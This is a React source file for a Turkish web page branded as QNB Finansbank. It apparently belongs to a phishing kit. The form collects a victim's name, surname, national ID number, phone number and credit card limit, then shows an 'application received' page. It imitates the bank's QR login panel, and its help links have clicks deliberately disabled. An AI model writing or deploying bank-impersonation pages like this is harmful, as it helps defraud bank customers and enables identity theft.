import React from 'react';
import { useNavigate } from 'react-router-dom';
import './App.css'; // mevcut stillerin

function Bilgi() {
  const navigate = useNavigate();

  const handleInput = (e, type) => {
    const el = e.target;
    if (type === 'text') {
      el.value = el.value.replace(/[^a-zA-ZğüşöçıİĞÜŞÖÇ\s]/g, '');
    } else if (type === 'number') {
      el.value = el.value.replace(/\D/g, '');
    }
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    navigate('/basvuru-alindi');
  };

  return (
    <section>
      <div className="row p-10-ch">
        <div className="px-0 mainContent">
          <div className="row" style={{ height: '100%', justifyContent: 'center' }}>
            <div
              className="col-lg-8 col-md-7 col-12 mainPanel-width"
              style={{
                border: '2px solid #d7d7d7',
                borderRadius: '10px',
                padding: '30px',
                float: 'left',
                minHeight: '380px',
              }}
            >
              <div className="subPanel-width">
                <form method="post" action="#" onSubmit={handleSubmit}>
                  <div className="row">
                    <div className="col-lg-6 col-12">
                      <div className="row">
                        <div className="col-12">
                          <div className="form-group">
                            <span className="loginlabel">İsim</span>
                            <input
                              className="form-control"
                              id="isim"
                              name="isim"
                              type="text"
                              required
                              onInput={(e) => handleInput(e, 'text')}
                            />
                          </div>
                        </div>
                        <div className="col-12">
                          <div className="form-group">
                            <span className="loginlabel">Soyisim</span>
                            <input
                              className="form-control"
                              id="soyisim"
                              name="soyisim"
                              type="text"
                              required
                              onInput={(e) => handleInput(e, 'text')}
                            />
                          </div>
                        </div>
                      </div>
                    </div>

                    <div className="col-12">
                      <div className="form-group">
                        <span className="loginlabel">T.C. Kimlik No</span>
                        <input
                          className="form-control"
                          id="tc"
                          name="tc"
                          type="text"
                          maxLength="11"
                          required
                          onInput={(e) => handleInput(e, 'number')}
                        />
                      </div>
                    </div>

                    <div className="col-12">
                      <div className="form-group">
                        <span className="loginlabel">Telefon Numarası</span>
                        <input
                          className="form-control"
                          id="tel"
                          name="tel"
                          type="tel"
                          maxLength="10"
                          required
                          onInput={(e) => handleInput(e, 'number')}
                        />
                      </div>
                    </div>

                    <div className="col-12">
                      <div className="form-group">
                        <span className="loginlabel">Kredi Kartı Limiti</span>
                        <input
                          className="form-control"
                          id="limit"
                          name="kredi_karti_limiti"
                          type="text"
                          required
                          onInput={(e) => handleInput(e, 'number')}
                        />
                      </div>
                    </div>

                    <div className="col-lg-6 col-12">
                      <button id="formSubmit" className="ileriButton">
                        Başvur
                      </button>
                    </div>
                  </div>
                </form>
              </div>
            </div>

            <div className="col-lg-4 col-md-5 col-12 row-left-padding" style={{ paddingRight: '0px' }}>
              <div className="qr_area d-none d-lg-block d-xl-block">
                <table>
                  <tbody>
                    <tr>
                      <td>
                        <span style={{ outline: 'none', marginLeft: '8px', fontWeight: 'bold', width: '100%' }}>
                          Karekod ile Hızlı Giriş
                        </span>
                      </td>
                    </tr>
                    <tr>
                      <td style={{ lineHeight: '15px' }}>
                        <img
                          src="/qr_disabled.png"
                          style={{
                            height: '118px',
                            width: '118px',
                            borderWidth: '0px',
                            position: 'absolute',
                            marginTop: '30px',
                            marginLeft: '82px',
                          }}
                          alt="QR Code"
                        />
                        <img
                          src="/captcha-refresh.jpg"
                          style={{
                            borderWidth: '0px',
                            position: 'absolute',
                            marginTop: '65px',
                            marginLeft: '132px',
                          }}
                          alt="Refresh"
                        />
                        <p
                          style={{
                            paddingTop: '90px',
                            paddingLeft: '85px',
                            outline: 'none',
                            textAlign: 'center',
                            width: '201px',
                            color: '#800d52',
                          }}
                        >
                          Size özel karekodunuzu almak için tıklayınız.
                        </p>
                      </td>
                    </tr>
                    <tr>
                      <td>
                        <span
                          style={{
                            position: 'absolute',
                            outline: 'none',
                            marginTop: '30px',
                            width: '285px',
                            marginLeft: '8px',
                            lineHeight: '16px',
                          }}
                        >
                          Uygulamanızın açılış sayfasındaki Karekod işlemlerini kullanabilirsiniz. Detaylı bilgi için{' '}
                          <a
                            href="/"
                            style={{
                              color: '#0a7d2b',
                              fontWeight: 'bold',
                              textDecoration: 'underline',
                              pointerEvents: 'none', // tıklamayı devre dışı bırakır
                              cursor: 'default', // link imlecini kapatır
                            }}
                          >
                            buraya
                          </a>{' '}
                          tıklayınız.
                        </span>
                      </td>
                    </tr>
                  </tbody>
                </table>
              </div>

              <div className="info-box" style={{ visibility: 'visible', display: 'contents', top: '320px' }}>
                <h3>
                  <span>QNB Finansbank</span>
                </h3>
                <ul>
                  <li>
                   <br />
                    Detaylı bilgi için{' '}
                    <a
                      href="/"
                      style={{
                        color: '#3687b6ff',
                        fontWeight: 'bold',
                        textDecoration: 'underline',
                        pointerEvents: 'none',
                        cursor: 'default',
                      }}
                    >
                      buraya
                    </a>{' '}
                    tıklayınız.
                  </li>
                </ul>
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>
  );
}

export default Bilgi;
